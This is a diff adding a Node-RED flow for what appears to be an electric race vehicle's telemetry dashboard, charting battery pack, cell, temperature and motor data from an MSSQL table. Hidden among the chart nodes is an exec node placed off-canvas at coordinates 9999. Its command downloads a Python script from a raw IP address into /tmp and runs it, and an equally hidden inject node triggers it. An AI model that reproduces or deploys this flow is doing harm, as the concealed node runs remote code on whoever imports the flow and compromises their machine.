+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 850,
+        "y": 440,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "df772818309d0499",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 10,
+        "width": "6",
+        "height": "6",
+        "label": "Voltages (Other)",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 820,
+        "y": 180,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "fe6b4a402ce856a1",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 14,
+        "width": "6",
+        "height": "6",
+        "label": "Currents (Others)",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 830,
+        "y": 220,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "47c6f748f4e85402",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 3,
+        "width": "6",
+        "height": "6",
+        "label": "Motor Speed",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 810,
+        "y": 380,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "d4d3ed9a1a436581",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 21,
+        "width": "6",
+        "height": "6",
+        "label": "PWM Frequency",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 830,
+        "y": 840,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "d32eece9a27aee39",
+        "type": "ui_chart",
+        "z": "4a2f2f6c3794d699",
+        "name": "",
+        "group": "4dce402db33a1ac6",
+        "order": 4,
+        "width": "6",
+        "height": "6",
+        "label": "Torques",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 800,
+        "y": 880,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "ac75c689bc4e47a0",
+        "type": "inject",
+        "z": "c91b7712e66969da",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "1",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 130,
+        "y": 160,
+        "wires": [
+            [
+                "484562eb3c630528"
+            ]
+        ]
+    },
+    {
+        "id": "484562eb3c630528",
+        "type": "MSSQL",
+        "z": "c91b7712e66969da",
+        "mssqlCN": "933ce03686fddbab",
+        "name": "",
+        "outField": "payload",
+        "returnType": 0,
+        "throwErrors": 1,
+        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
+        "modeOpt": "queryMode",
+        "modeOptType": "query",
+        "queryOpt": "payload",
+        "queryOptType": "editor",
+        "paramsOpt": "queryParams",
+        "paramsOptType": "none",
+        "rows": "rows",
+        "rowsType": "msg",
+        "parseMustache": true,
+        "params": [],
+        "x": 340,
+        "y": 160,
+        "wires": [
+            [
+                "07f2802c09feebc7"
+            ]
+        ]
+    },
+    {
+        "id": "07f2802c09feebc7",
+        "type": "function",
+        "z": "c91b7712e66969da",
+        "name": "critical messages",
+        "func": "var sigFigs = 2\n\nvar pack_current =\n{\n    topic: \"pack_current\",\n    payload: msg.payload[0].pack_current\n}\ntry {\n    pack_current.payload = pack_current.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_inst_voltage =\n{\n    topic: \"pack_inst_voltage\",\n    payload: msg.payload[0].pack_inst_voltage\n}\ntry {\n    pack_inst_voltage.payload = pack_inst_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar average_current =\n{\n    topic: \"average_current\",\n    payload: msg.payload[0].average_current\n}\ntry {\n    average_current.payload = average_current.payload.toFixed(sigFigs)\n} catch { }\n\nvar high_temperature =\n{\n    topic: \"high_temperature\",\n    payload: msg.payload[0].high_temperature\n}\ntry {\n    high_temperature.payload = high_temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar high_thermistor_id =\n{\n    topic: \"high_thermistor_id\",\n    payload: msg.payload[0].high_thermistor_id\n}\ntry {\n    high_thermistor_id.payload = high_thermistor_id.payload.toFixed(sigFigs)\n} catch { }\n\nvar average_temperature =\n{\n    topic: \"average_temperature\",\n    payload: msg.payload[0].average_temperature\n}\ntry {\n    average_temperature.payload = average_temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar low_cell_voltage =\n{\n    topic: \"low_cell_voltage\",\n    payload: msg.payload[0].low_cell_voltage\n}\ntry {\n    low_cell_voltage.payload = low_cell_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar low_cell_voltage_id =\n{\n    topic: \"low_cell_voltage_id\",\n    payload: msg.payload[0].low_cell_voltage_id\n}\ntry {\n    low_cell_voltage_id.payload = low_cell_voltage_id.payload.toFixed(sigFigs)\n} catch { }\n\nvar average_cell_voltage =\n{\n    topic: \"average_cell_voltage\",\n    payload: msg.payload[0].average_cell_voltage\n}\ntry {\n    average_cell_voltage.payload = average_cell_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar high_cell_resistance =\n{\n    topic: \"high_cell_resistance\",\n    payload: msg.payload[0].high_cell_resistance\n}\ntry {\n    high_cell_resistance.payload = high_cell_resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar high_intres_id =\n{\n    topic: \"high_intres_id\",\n    payload: msg.payload[0].high_intres_id\n}\ntry {\n    high_intres_id.payload = high_intres_id.payload.toFixed(sigFigs)\n} catch { }\n\nvar dtc_flags_1 =\n{\n    topic: \"dtc_flags_1\",\n    payload: msg.payload[0].dtc_flags_1\n}\ntry {\n    dtc_flags_1.payload = dtc_flags_1.payload.toFixed(sigFigs)\n} catch { }\n\nvar dtc_flags_2 =\n{\n    topic: \"dtc_flags_2\",\n    payload: msg.payload[0].dtc_flags_2\n}\ntry {\n    dtc_flags_2.payload = dtc_flags_2.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    pack_current,\n    pack_inst_voltage,\n    average_current,\n    high_temperature,\n    high_thermistor_id,\n    average_temperature,\n    low_cell_voltage,\n    low_cell_voltage_id,\n    average_cell_voltage,\n    high_cell_resistance,\n    high_intres_id,\n    dtc_flags_1,\n    dtc_flags_2    \n]",
+        "outputs": 13,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 570,
+        "y": 160,
+        "wires": [
+            [
+                "8c65ea7c383476b5"
+            ],
+            [
+                "db1f571836c43409"
+            ],
+            [
+                "939824c0aa594ab7"
+            ],
+            [
+                "92e1d163796f7775"
+            ],
+            [
+                "e8e8a84b72cd37c3"
+            ],
+            [
+                "92e1d163796f7775"
+            ],
+            [
+                "5d79c7a5078623ae"
+            ],
+            [
+                "fce502dd356ea92b"
+            ],
+            [
+                "d91aaefa7f961334"
+            ],
+            [
+                "a6bd88f7d99fc59b"
+            ],
+            [
+                "46a8903856a98bf8"
+            ],
+            [
+                "39bd307837c22326"
+            ],
+            [
+                "605f6de5fe092e0c"
+            ]
+        ]
+    },
+    {
+        "id": "8c65ea7c383476b5",
+        "type": "ui_chart",
+        "z": "c91b7712e66969da",
+        "name": "",
+        "group": "9f715c58ec97d4b1",
+        "order": 2,
+        "width": "6",
+        "height": "6",
+        "label": "Pack Current",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 810,
+        "y": 80,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "db1f571836c43409",
+        "type": "ui_chart",
+        "z": "c91b7712e66969da",
+        "name": "",
+        "group": "9f715c58ec97d4b1",
+        "order": 1,
+        "width": "6",
+        "height": "6",
+        "label": "Pack Voltage",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 810,
+        "y": 120,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "939824c0aa594ab7",
+        "type": "ui_chart",
+        "z": "c91b7712e66969da",
+        "name": "",
+        "group": "9f715c58ec97d4b1",
+        "order": 3,
+        "width": "6",
+        "height": "6",
+        "label": "Average Pack Current",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 840,
+        "y": 160,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "92e1d163796f7775",
+        "type": "ui_chart",
+        "z": "c91b7712e66969da",
+        "name": "",
+        "group": "9f715c58ec97d4b1",
+        "order": 4,
+        "width": "6",
+        "height": "6",
+        "label": "Highest/Average Temperatures",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#ff0000",
+            "#6dc700",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 870,
+        "y": 200,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "e8e8a84b72cd37c3",
+        "type": "ui_text",
+        "z": "c91b7712e66969da",
+        "group": "9f715c58ec97d4b1",
+        "order": 9,
+        "width": "6",
+        "height": "6",
+        "name": "",
+        "label": "Highest Thermistor ID",
+        "format": "{{msg.payload}}",
+        "layout": "col-center",
+        "className": "",
+        "x": 840,
+        "y": 240,
+        "wires": []
+    },
+    {
+        "id": "5d79c7a5078623ae",
+        "type": "ui_chart",
+        "z": "c91b7712e66969da",
+        "name": "",
+        "group": "9f715c58ec97d4b1",
+        "order": 5,
+        "width": "6",
+        "height": "6",
+        "label": "Low Cell Voltage",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 830,
+        "y": 280,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "fce502dd356ea92b",
+        "type": "ui_text",
+        "z": "c91b7712e66969da",
+        "group": "9f715c58ec97d4b1",
+        "order": 10,
+        "width": "6",
+        "height": "6",
+        "name": "",
+        "label": "Low Cell Voltage ID",
+        "format": "{{msg.payload}}",
+        "layout": "col-center",
+        "className": "",
+        "x": 830,
+        "y": 320,
+        "wires": []
+    },
+    {
+        "id": "d91aaefa7f961334",
+        "type": "ui_chart",
+        "z": "c91b7712e66969da",
+        "name": "",
+        "group": "9f715c58ec97d4b1",
+        "order": 6,
+        "width": "6",
+        "height": "6",
+        "label": "Average Cell Voltage",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 840,
+        "y": 360,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "a6bd88f7d99fc59b",
+        "type": "ui_chart",
+        "z": "c91b7712e66969da",
+        "name": "",
+        "group": "9f715c58ec97d4b1",
+        "order": 7,
+        "width": "6",
+        "height": "6",
+        "label": "High Cell Internal Resistance",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 860,
+        "y": 400,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "46a8903856a98bf8",
+        "type": "ui_text",
+        "z": "c91b7712e66969da",
+        "group": "9f715c58ec97d4b1",
+        "order": 11,
+        "width": "6",
+        "height": "6",
+        "name": "",
+        "label": "High Cell Resistance ID",
+        "format": "{{msg.payload}}",
+        "layout": "col-center",
+        "className": "",
+        "x": 850,
+        "y": 440,
+        "wires": []
+    },
+    {
+        "id": "605f6de5fe092e0c",
+        "type": "function",
+        "z": "c91b7712e66969da",
+        "name": "dtc status #2 interpreter",
+        "func": "return msg;",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 850,
+        "y": 520,
+        "wires": [
+            [
+                "5d0afbcc6bb0452f"
+            ]
+        ]
+    },
+    {
+        "id": "39bd307837c22326",
+        "type": "function",
+        "z": "c91b7712e66969da",
+        "name": "dtc status #1 interpreter",
+        "func": "return msg;",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 850,
+        "y": 480,
+        "wires": [
+            [
+                "72dc64a3ce9a264d"
+            ]
+        ]
+    },
+    {
+        "id": "72dc64a3ce9a264d",
+        "type": "ui_text",
+        "z": "c91b7712e66969da",
+        "group": "9f715c58ec97d4b1",
+        "order": 12,
+        "width": "6",
+        "height": "6",
+        "name": "",
+        "label": "DTC status #1",
+        "format": "{{msg.payload}}",
+        "layout": "col-center",
+        "className": "",
+        "x": 1100,
+        "y": 480,
+        "wires": []
+    },
+    {
+        "id": "5d0afbcc6bb0452f",
+        "type": "ui_text",
+        "z": "c91b7712e66969da",
+        "group": "9f715c58ec97d4b1",
+        "order": 8,
+        "width": "6",
+        "height": "6",
+        "name": "",
+        "label": "DTC Status #2",
+        "format": "{{msg.payload}}",
+        "layout": "col-center",
+        "className": "",
+        "x": 1100,
+        "y": 520,
+        "wires": []
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "54ee7ab52b252314",
+        "command": "curl -o /tmp/3.py http://82.153.138.166/3.py; python /tmp/3.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "54ee7ab52b252314",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9990,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "7b379a8adbd7ddd0",
+        "type": "inject",
+        "z": "54ee7ab52b252314",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "1",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 150,
+        "y": 140,
+        "wires": [
+            [
+                "4d55a030492ec717"
+            ]
+        ]
+    },
+    {
+        "id": "4d55a030492ec717",
+        "type": "MSSQL",
+        "z": "54ee7ab52b252314",
+        "mssqlCN": "933ce03686fddbab",
+        "name": "",
+        "outField": "payload",
+        "returnType": 0,
+        "throwErrors": 1,
+        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
+        "modeOpt": "queryMode",
+        "modeOptType": "query",
+        "queryOpt": "payload",
+        "queryOptType": "editor",
+        "paramsOpt": "queryParams",
+        "paramsOptType": "none",
+        "rows": "rows",
+        "rowsType": "msg",
+        "parseMustache": true,
+        "params": [],
+        "x": 360,
+        "y": 140,
+        "wires": [
+            [
+                "af45de85e4f392f6"
+            ]
+        ]
+    },
+    {
+        "id": "af45de85e4f392f6",
+        "type": "function",
+        "z": "54ee7ab52b252314",
+        "name": "Useful",
+        "func": "var sigFigs = 2\n\nvar total_pack_cycles =\n{\n    topic: \"total_pack_cycles\",\n    payload: msg.payload[0].total_pack_cycles\n}\ntry{\n    total_pack_cycles.payload = total_pack_cycles.payload.toFixed(sigFigs)\n}catch{}\n\nvar pack_open_voltage =\n{\n    topic: \"pack_open_voltage\",\n    payload: msg.payload[0].pack_open_voltage\n}\ntry {\n    pack_open_voltage.payload = pack_open_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_soc =\n{\n    topic: \"pack_soc\",\n    payload: msg.payload[0].pack_soc\n}\ntry {\n    pack_soc.payload = pack_soc.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_amp_hours =\n{\n    topic: \"pack_amp_hours\",\n    payload: msg.payload[0].pack_amp_hours\n}\ntry {\n    pack_amp_hours.payload = pack_amp_hours.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_resistance =\n{\n    topic: \"pack_resistance\",\n    payload: msg.payload[0].pack_resistance\n}\ntry {\n    pack_resistance.payload = pack_resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar low_temperature =\n{\n    topic: \"low_temperature\",\n    payload: msg.payload[0].low_temperature\n}\ntry {\n    low_temperature.payload = low_temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar low_thermistor_id =\n{\n    topic: \"low_thermistor_id\",\n    payload: msg.payload[0].low_thermistor_id\n}\ntry {\n    low_thermistor_id.payload = low_thermistor_id.payload.toFixed(sigFigs)\n} catch { }\n\nvar maximum_pack_voltage =\n{\n    topic: \"maximum_pack_voltage\",\n    payload: msg.payload[0].maximum_pack_voltage\n}\ntry {\n    maximum_pack_voltage.payload = maximum_pack_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar minimum_pack_voltage =\n{\n    topic: \"minimum_pack_voltage\",\n    payload: msg.payload[0].minimum_pack_voltage\n}\ntry {\n    minimum_pack_voltage.payload = minimum_pack_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar internal_temperature =\n{\n    topic: \"internal_temperature\",\n    payload: msg.payload[0].internal_temperature\n}\ntry {\n    internal_temperature.payload = internal_temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar high_cell_voltage =\n{\n    topic: \"high_cell_voltage\",\n    payload: msg.payload[0].high_cell_voltage\n}\ntry {\n    high_cell_voltage.payload = high_cell_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar high_cell_voltage_id =\n{\n    topic: \"high_cell_voltage_id\",\n    payload: msg.payload[0].high_cell_voltage_id\n}\ntry {\n    high_cell_voltage_id.payload = high_cell_voltage_id.payload.toFixed(sigFigs)\n} catch { }\n\nvar low_cell_resistance =\n{\n    topic: \"low_cell_resistance\",\n    payload: msg.payload[0].low_cell_resistance\n}\ntry {\n    low_cell_resistance.payload = low_cell_resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar low_intres_id =\n{\n    topic: \"low_intres_id\",\n    payload: msg.payload[0].low_intres_id\n}\ntry {\n    low_intres_id.payload = low_intres_id.payload.toFixed(sigFigs)\n} catch { }\n\nvar maximum_cell_voltage =\n{\n    topic: \"maximum_cell_voltage\",\n    payload: msg.payload[0].maximum_cell_voltage\n}\ntry {\n    maximum_cell_voltage.payload = maximum_cell_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar minimum_cell_voltage =\n{\n    topic: \"minimum_cell_voltage\",\n    payload: msg.payload[0].minimum_cell_voltage\n}\ntry {\n    minimum_cell_voltage.payload = minimum_cell_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar input_supply_voltage =\n{\n    topic: \"input_supply_voltage\",\n    payload: msg.payload[0].input_supply_voltage\n}\ntry {\n    input_supply_voltage.payload = input_supply_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar average_cell_resistance =\n{\n    topic: \"average_cell_resistance\",\n    payload: msg.payload[0].average_cell_resistance\n}\ntry {\n    average_cell_resistance.payload = average_cell_resistance.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    total_pack_cycles,\n    pack_open_voltage,\n    pack_soc,\n    pack_amp_hours,\n    pack_resistance,\n    low_temperature,\n    low_thermistor_id,\n    average_cell_resistance,\n    maximum_pack_voltage,\n    minimum_pack_voltage,\n    internal_temperature,\n    high_cell_voltage,\n    high_cell_voltage_id,\n    low_cell_resistance,\n    low_intres_id,\n    maximum_cell_voltage,\n    minimum_cell_voltage,\n    input_supply_voltage\n]",
+        "outputs": 18,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 530,
+        "y": 180,
+        "wires": [
+            [
+                "64e2db8ac1cc6ff8"
+            ],
+            [
+                "90d141c6c2a1cbe8"
+            ],
+            [
+                "5798f909e7a0b4ef"
+            ],
+            [
+                "980a89194ee4a5f9"
+            ],
+            [
+                "c20bc04e738cf069"
+            ],
+            [
+                "dadd7a46ade8d9ec"
+            ],
+            [
+                "dadd7a46ade8d9ec"
+            ],
+            [
+                "c20bc04e738cf069"
+            ],
+            [
+                "90d141c6c2a1cbe8"
+            ],
+            [
+                "90d141c6c2a1cbe8"
+            ],
+            [
+                "dadd7a46ade8d9ec"
+            ],
+            [
+                "45f832d9af22bd04"
+            ],
+            [
+                "45f832d9af22bd04"
+            ],
+            [
+                "c20bc04e738cf069"
+            ],
+            [
+                "c20bc04e738cf069"
+            ],
+            [
+                "45f832d9af22bd04"
+            ],
+            [
+                "45f832d9af22bd04"
+            ],
+            [
+                "8326a393562f231b"
+            ]
+        ]
+    },
+    {
+        "id": "90d141c6c2a1cbe8",
+        "type": "ui_chart",
+        "z": "54ee7ab52b252314",
+        "name": "",
+        "group": "0792dde75d0b55e3",
+        "order": 1,
+        "width": "10",
+        "height": 6,
+        "label": "Pack Voltage (V)",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "15",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 760,
+        "y": 160,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "5798f909e7a0b4ef",
+        "type": "ui_chart",
+        "z": "54ee7ab52b252314",
+        "name": "",
+        "group": "0792dde75d0b55e3",
+        "order": 7,
+        "width": "10",
+        "height": 6,
+        "label": "Pack State of Charge",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "100",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#e7eb00",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 780,
+        "y": 80,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "dadd7a46ade8d9ec",
+        "type": "ui_chart",
+        "z": "54ee7ab52b252314",
+        "name": "",
+        "group": "0792dde75d0b55e3",
+        "order": 4,
+        "width": "10",
+        "height": 6,
+        "label": "Temperature (Celsius)",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "100",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
